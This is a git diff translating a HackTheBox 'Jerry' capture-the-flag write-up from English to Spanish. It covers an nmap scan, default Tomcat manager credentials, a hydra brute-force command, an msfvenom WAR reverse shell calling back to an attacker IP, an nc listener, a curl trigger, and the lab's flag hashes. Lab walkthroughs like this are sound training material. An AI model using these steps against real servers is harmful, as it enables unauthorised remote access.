@@ -1,21 +1,21 @@
 # Jerry — HackTheBox
 
-> **Difficulty:** Easy · **OS:** Windows · **Date:** Oct 14, 2026  
-> **Author:** [@ph4n3s](https://github.com/phanesopenyoureyes)
+> **Dificultad:** Easy · **OS:** Windows · **Fecha:** Oct 14, 2026  
+> **Autor:** [@ph4n3s](https://github.com/phanesopenyoureyes)
 
 ---
 
-## Table of contents
-1. [Recon](#1-recon)
-2. [Enumeration](#2-enumeration)
-3. [Exploitation](#3-exploitation)
-4. [Post-exploitation](#4-post-exploitation)
+## Índice
+1. [Reconocimiento](#1-reconocimiento)
+2. [Enumeración](#2-enumeración)
+3. [Explotación](#3-explotación)
+4. [Postexplotación](#4-postexplotación)
 
 ---
 
-## 1. Recon
+## 1. Reconocimiento
 
-We check that the machine is up:
+Comprobamos que la máquina está activa:
 
 ```bash
 ping -c 4 10.129.75.155
@@ -23,117 +23,117 @@ ping -c 4 10.129.75.155
 
 ---
 
-## 2. Enumeration
+## 2. Enumeración
 
-### 2.1 Port scan
+### 2.1 Escaneo de puertos
 
 ```bash
 nmap -p- --min-rate 5000 -T4 10.129.75.155 > ~/HTB_machines/Jerry/allports
 ```
 
-> **Note:** Although on HTB we could use `-A --script vuln` directly, in a real environment it would be too aggressive. Doing it in stages is better practice.
+> **Nota:** Aunque en HTB podríamos usar `-A --script vuln` directamente, en un entorno real sería demasiado agresivo. Hacerlo por partes es mejor práctica.
 
-**Result:** port `8080` open as an HTTP proxy.
+**Resultado:** puerto `8080` abierto como proxy HTTP.
 
 ```bash
 nmap -p 8080 -sC -sV 10.129.75.155 -oN ~/HTB_machines/Jerry/targeted
 ```
 
-**Result:** Apache Tomcat 7.0.88 with Coyote JSP engine 1.1. An old version with a default configuration.
+**Resultado:** Apache Tomcat 7.0.88 con Coyote JSP engine 1.1. Versión antigua con configuración por defecto.
 
 ---
 
-### 2.2 Vector identification
+### 2.2 Identificación de vectores
 
-We browse to `http://10.129.75.155:8080/`. When we click **Manager App**, the **401 Unauthorized** error page exposes the example credentials:
+Accedemos desde el navegador a `http://10.129.75.155:8080/`. Al pulsar **Manager App**, la página de error **401 Unauthorized** expone las credenciales de ejemplo:
 
-| Field | Value |
+| Campo | Valor |
 |-------|-------|
-| User | `tomcat` |
+| Usuario | `tomcat` |
 | Password | `s3cret` |
 
-> **Critical misconfiguration:** Tomcat's default installation shows credentials on the error page.
+> **Fallo crítico de configuración:** la instalación por defecto de Tomcat muestra credenciales en la página de error.
 
-In a real environment we would use brute force:
+En un entorno real usaríamos fuerza bruta:
 
 ```bash
 hydra -l tomcat -P /usr/share/wordlists/rockyou.txt 10.129.75.155 -s 8080 http-get /manager/html
 ```
 
-Once inside the manager we identify two vectors:
-- A panel with deployed applications and active subdomains.
-- An option to **upload WAR files** → lets us deploy arbitrary Java code.
+Una vez dentro del manager identificamos dos vectores:
+- Panel con aplicaciones desplegadas y subdominios activos.
+- Opción de **subir archivos WAR** → permite desplegar código Java arbitrario.
 
 ---
 
-## 3. Exploitation
+## 3. Explotación
 
-A **WAR (Web Application Archive)** file is a ZIP package containing a Java web application. Tomcat is designed to receive and deploy them — we put a reverse shell inside one.
+Un archivo **WAR (Web Application Archive)** es un paquete ZIP con una aplicación web Java. Tomcat está diseñado para recibirlos y desplegarlos — metemos una reverse shell dentro.
 
-> **What is a reverse shell?**  
-> Instead of connecting to the victim, it is the victim that connects to us. This gets around firewalls that block incoming connections.
+> **¿Qué es una reverse shell?**  
+> En lugar de conectarnos a la víctima, es ella quien se conecta a nosotros. Esto evita firewalls que bloqueen conexiones entrantes.
 
-### Step 1 — Generate the malicious WAR
+### Paso 1 — Generar el WAR malicioso
 
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.39 LPORT=4444 -f war -o shell.war
 ```
 
-| Flag | Description |
+| Flag | Descripción |
 |------|-------------|
-| `-p java/jsp_shell_reverse_tcp` | Java payload compatible with Tomcat |
-| `LHOST` | Our HTB VPN IP (`tun0`), **not** the local IP |
-| `LPORT` | The port we will listen on |
-| `-f war` | WAR format |
-| `-o shell.war` | Output file |
+| `-p java/jsp_shell_reverse_tcp` | Payload Java compatible con Tomcat |
+| `LHOST` | Nuestra IP de la VPN de HTB (`tun0`), **no** la IP local |
+| `LPORT` | Puerto donde escucharemos |
+| `-f war` | Formato WAR |
+| `-o shell.war` | Archivo de salida |
 
-### Step 2 — Start listening
+### Paso 2 — Ponerse en escucha
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Step 3 — Upload the WAR
+### Paso 3 — Subir el WAR
 
-`http://10.129.75.155:8080/manager/html` → **WAR file to deploy** section → select `shell.war` → **Deploy**. Tomcat deploys the app and it shows up as `/shell`.
+`http://10.129.75.155:8080/manager/html` → sección **WAR file to deploy** → seleccionamos `shell.war` → **Deploy**. Tomcat despliega la app y aparece como `/shell`.
 
-### Step 4 — Trigger the shell
+### Paso 4 — Ejecutar la shell
 
 ```bash
 curl http://10.129.75.155:8080/shell/
 ```
 
-> The `curl` is the trigger. The payload connects back to our `nc` and the curl will hang while the shell is active — expected behavior. It also works from the browser.
+> El `curl` es el gatillo. El payload se conecta a nuestro `nc` y el curl quedará colgado mientras la shell esté activa — comportamiento esperado. También funciona desde el navegador.
 
 ---
 
-## 4. Post-exploitation
+## 4. Postexplotación
 
-Jerry is a **Windows** machine. The commands change:
+Jerry es una máquina **Windows**. Los comandos cambian:
 
 | Linux | Windows |
 |-------|---------|
 | `ls` | `dir` |
-| `cat file` | `type file` |
+| `cat archivo` | `type archivo` |
 | `pwd` | `cd` |
 
-We check privileges:
+Comprobamos privilegios:
 
 
-> Tomcat on Windows usually runs with elevated privileges. On this machine **no privilege escalation is needed**.
+> Tomcat en Windows suele correr con privilegios elevados. En esta máquina **no es necesario escalar privilegios**.
 
-We navigate to the flags:
+Navegamos a las flags:
 
 
-> Jerry has a quirk: both flags live in a single file.
+> Jerry tiene una particularidad: ambas flags están en un único archivo.
 
 ### Flags
 
 | | Hash |
 |-|------|
-| User | `7004dbcef0f854e0fb401875f26ebd00` |
-| Administrator | `04a8b36e1545a455393d067e772fe90e` |
+| Usuario | `7004dbcef0f854e0fb401875f26ebd00` |
+| Administrador | `04a8b36e1545a455393d067e772fe90e` |
 
 ---
 
-*Write-up by [ph4n3s](https://github.com/phanesopenyoureyes) — I will keep improving it as I learn more.*
+*Write-up por [ph4n3s](https://github.com/phanesopenyoureyes) — seguiré mejorando conforme aprenda más.*
